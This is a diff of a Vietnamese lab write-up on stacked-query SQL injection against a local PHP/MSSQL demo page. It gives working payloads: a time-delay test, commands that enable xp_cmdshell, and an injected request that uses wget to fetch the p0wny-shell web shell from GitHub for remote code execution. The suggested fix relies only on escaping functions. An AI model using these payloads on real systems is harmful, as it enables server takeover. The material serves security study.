@@ -3,14 +3,16 @@
 ## Về dạng này em dùng source của bài StackQuery ạ nhưng mà với một hướng đi khác là em sẽ wget 1 shell về để RCE ạ
 ## Còn một hướng khác nữa là em sẽ dùng LOAD_FILE để lấy file php độc hại về sever hoặc là em sẽ dùng cách truyền đầu ra đến máy của kẻ nghe lén ạ
 
-# Link demo:
+# Link demo : 
 # Cách khắc phục :
-- Hoặc làm sạch đầu vào $cleaned_username = sqlsrv_real_escape_string($conn, $name);
+
+- Hoặc làm sạch đầu vào   $cleaned_username = sqlsrv_real_escape_string($conn, $name);
 $cleaned_password = mysqli_real_escape_string($conn, $password);
 - Và tìm hiểu các CVE của các phiên bản để tránh được lỗi này có thể xảy ra.
 
+
 + Bắt đầu vào với một giao diện như trên
-![Alt text](image-1.png)
+![Alt text](./imageStackQuery/image.png)
 
 - Đây là đoạn code bị dính lỗi
 
@@ -36,7 +38,9 @@ if (isset($_GET['name'])) {
                     <div class="relative z-20 p-6 group">
                         <div class="relative block h-64 mb-4 -mt-56 overflow-hidden rounded -top-full ">
                             <img class="object-cover w-full h-full transition-all group-hover:scale-110"
-                                src="https://pplay.vn/media/catalog/product/cache/1/image/485x440/9df78eab33525d08d6e5fb8d27136e95/7/0/70222-1.jpg" alt="">
+                                
+                                 
+                        src="https://pplay.vn/media/catalog/product/cache/1/image/485x440/9df78eab33525d08d6e5fb8d27136e95/7/0/70222-1.jpg" alt="">
                             <div class="absolute flex flex-col top-4 right-4">
                                 <!-- Wishlist and Cart buttons here -->
                             </div>
@@ -120,13 +124,13 @@ if (isset($_GET['name'])) {
 - Bởi vì được truyền trực tiếp nên em có thể đoán là bị dính lỗi sql injection
 - Em sẽ khai thác theo hướng thực thi shell trong MSSQL đây là một dạng stack query
 - Vào trong burpsuite và chọn request bị dính lỗi như sau:
-![Alt text](image-2.png)
+![Alt text](./imageStackQuery/image-1.png)
 
 - Em thử thêm dấu ';' vào đằng sau và request vẫn thực hiện bình thường
-![Alt text](image-3.png)
+![Alt text](./imageStackQuery/image-2.png)
 - Sau đó em dùng payload "; WAITFOR DELAY '0:0:5'; -- "
 - Em nhận lại được response sau 5s
-![Alt text](image-4.png)
+![Alt text](./imageStackQuery/image-3.png)
 - Điều này chứng tỏ là em có thể thực hiện chồng query ở trong trường hợp này
 - Em muốn thực hiện được xp_cmdshell trong truy vấn để lấy dữ liệu
 + Ban đầu em sẽ phải cài đặt lại setting để có thể thực hiện shell
@@ -135,7 +139,7 @@ em tham khảo bài viết này:  https://medium.com/@notsoshant/a-not-so-blind-
 Và dùng payload :  ";EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE; WAITFOR DELAY '0:0:5'; --"
 
 - Và em nhận được kết quả sau 5s  chứng tỏ là đã reconfig thành công
-![Alt text](image-5.png)
+![Alt text](./imageStackQuery/image-4.png)
 
 ## Đến đoạn này em thử
 wget https://github.com/flozz/p0wny-shell/blob/master/shell.php
@@ -143,13 +147,13 @@ wget https://github.com/flozz/p0wny-shell/blob/master/shell.php
 
 -  http://localhost/task2_KCSC/demo/stackQuery/index.php?name=items;EXEC%20xp_cmdshell%20%27wget+https://github.com/flozz/p0wny-shell/blob/master/shell.php%27;%20WAITFOR%20DELAY%20%270:0:5%27;%20--%20%22
 
-![Alt text](image.png)
+![Alt text](./imagesOOB/image.png)
 
 -- Sau đó em tải được file shell.php và bật nó lên để RCE ạ:<
 
 
 
-### Một số hướng khai thác 
+### Một số hướng khai thác khác
 
 <?php
 
